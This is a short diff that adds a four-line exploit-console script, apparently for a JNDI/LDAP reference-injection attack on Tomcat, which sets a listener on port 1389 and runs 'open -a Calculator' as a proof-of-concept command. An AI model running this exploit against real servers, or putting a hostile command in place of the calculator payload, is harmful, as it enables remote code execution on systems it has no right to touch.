@@ -1,0 +1,4 @@
+use exploit LDAPTomcatRefListener
+set command "open -a Calculator"
+set lport 1389
+run
